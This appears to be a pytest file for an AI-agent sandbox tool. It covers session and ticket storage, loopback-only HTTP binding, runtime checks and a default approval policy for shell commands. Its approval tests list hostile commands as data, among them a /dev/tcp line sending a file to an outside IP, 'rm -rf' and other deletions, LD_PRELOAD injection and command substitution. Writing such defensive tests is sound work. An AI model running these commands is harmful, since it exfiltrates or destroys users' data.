"""세션 저장(SQLite)과 평문 HTTP 바인딩 막기. Docker 없이 돈다."""

import time

import pytest

from agentbox.cli import bind_problem, is_loopback, runtime_problem
from agentbox.config import Settings
from agentbox.policy import Policy, simple_programs
from agentbox.desktop import DesktopControl


def test_session_survives_restart(tmp_path):
    db = tmp_path / "a.db"
    cookie, public = DesktopControl(db_path=db).new_session()
    assert DesktopControl(db_path=db).session(cookie) == public  # 다시 띄워도 로그인 유지
    d = DesktopControl(db_path=db)
    assert d.end_session(cookie) == public
    assert DesktopControl(db_path=db).session(cookie) is None  # 로그아웃은 저장소에서 지운다


def test_ticket_survives_restart_once(tmp_path):
    db = tmp_path / "a.db"
    t = DesktopControl(db_path=db).issue_ticket("sb_1")
    d = DesktopControl(db_path=db)
    assert d.redeem(t, "sb_2") is None            # 다른 샌드박스용으로 쓰면 버려진다
    t = DesktopControl(db_path=db).issue_ticket("sb_1")
    assert DesktopControl(db_path=db).redeem(t, "sb_1")
    assert DesktopControl(db_path=db).redeem(t, "sb_1") is None  # 1회용


def test_expiry_uses_wall_clock(tmp_path):
    db = tmp_path / "a.db"
    d = DesktopControl(db_path=db, ticket_ttl=0.05, session_ttl=0.05)
    t = d.issue_ticket("*")
    cookie, _ = d.new_session()
    time.sleep(0.1)
    d2 = DesktopControl(db_path=db)
    assert d2.redeem(t, "*") is None and d2.session(cookie) is None


def test_sessions_without_scope_dropped_on_upgrade(tmp_path):
    """범위가 없던 때의 세션은 화면 링크용인지 알 수 없어 버린다 (다시 로그인)."""
    import sqlite3

    db = tmp_path / "a.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE ui_sessions (hash TEXT PRIMARY KEY, public TEXT NOT NULL, created TEXT NOT NULL,"
                " expires REAL NOT NULL)")
    con.execute("INSERT INTO ui_sessions VALUES ('h', 'hs_old', 't', ?)", (time.time() + 3600,))
    con.commit()
    con.close()
    d = DesktopControl(db_path=db)
    assert d._db.execute("SELECT COUNT(*) FROM ui_sessions").fetchone()[0] == 0
    cookie, public = d.new_session()
    assert d.session(cookie) == public


def test_secrets_stored_hashed(tmp_path):
    db = tmp_path / "a.db"
    d = DesktopControl(db_path=db)
    t = d.issue_ticket("*")
    cookie, _ = d.new_session()
    raw = db.read_bytes()
    assert t.encode() not in raw and cookie.encode() not in raw


def test_leftover_lease(tmp_path):
    db = tmp_path / "a.db"
    a = DesktopControl(db_path=db)
    a.take("sb_1", "hs_1")
    a.take("sb_2", "hs_2")
    a.release("sb_2")
    b = DesktopControl(db_path=db)
    left = b.leftover_leases()
    assert [x["sandbox_id"] for x in left] == ["sb_1"] and left[0]["session"] == "hs_1"
    b.forget_lease("sb_1")
    assert DesktopControl(db_path=db).leftover_leases() == []
    assert a.leftover_leases() == []  # 자기 실행의 인수는 남은 것으로 치지 않는다


@pytest.mark.parametrize("host,ok", [("127.0.0.1", True), ("::1", True), ("localhost", True),
                                     ("127.0.0.2", True), ("0.0.0.0", False), ("192.168.0.5", False),
                                     ("::", False), ("example.com", False)])
def test_loopback(host, ok):
    assert is_loopback(host) is ok


def test_bind_problem():
    assert bind_problem("127.0.0.1", tls=False, behind_tls_proxy=False) is None
    assert "TLS" in bind_problem("0.0.0.0", tls=False, behind_tls_proxy=False)
    assert bind_problem("0.0.0.0", tls=True, behind_tls_proxy=False) is None
    assert bind_problem("0.0.0.0", tls=False, behind_tls_proxy=True) is None


DEFAULT = Policy.load(Settings().policy_path)


@pytest.mark.parametrize("cmd", [
    "ls -la /workspace", "cat a.md | grep 매출 | wc -l", "cd /workspace && ls; pwd", "wc -c < big.txt",
    "ls 2>/dev/null", "head -n 5 a.md 2>&1", "sha256sum blob.bin; ls -a", "mkdir -p outbox", "echo hello",
])
def test_default_policy_allows_read_only_exec(cmd):
    assert DEFAULT.decide("exec", {"command": cmd}).action == "allow", cmd


@pytest.mark.parametrize("cmd", [
    "find . -delete", "python3 -c 'import shutil; shutil.rmtree(\"/workspace\")'", "echo hi > a.md",
    "cat a > /dev/tcp/203.0.113.7/443", "cat $(echo a)", "ls `id`", "sh -c 'ls'", "LD_PRELOAD=/x.so cat a",
    "ls |& python3 x.py", "ls; truncate -s0 a.md", "mv a b", "cp a b", "sed -i d a.md", "ls <(id)",
    "cat a\npython3 x.py", "for f in *; do cat $f; done", "rm -rf /workspace/*",
])
def test_default_policy_needs_approval(cmd):
    assert DEFAULT.decide("exec", {"command": cmd}).action == "require_approval", cmd


def test_simple_programs():
    assert simple_programs("/bin/ls -l && cat x | wc") == {"ls", "cat", "wc"}
    assert simple_programs("echo a > b") is None
    assert simple_programs("echo 'unclosed") is None
    assert DEFAULT.decide("list_dir", {"path": "/workspace"}).action == "allow"
    assert DEFAULT.decide("write_file", {"path": "/workspace/a"}).action == "allow"
    assert DEFAULT.decide("delete_file", {"path": "/workspace/a"}).action == "require_approval"


def test_runtime_problem():
    assert runtime_problem("runc", exposed=False) is None          # 127.0.0.1 개발용
    assert "runc" in runtime_problem("runc", exposed=True)
    for strong in ("runsc", "kata-fc", "kata-qemu-firecracker"):
        assert runtime_problem(strong, exposed=True) is None
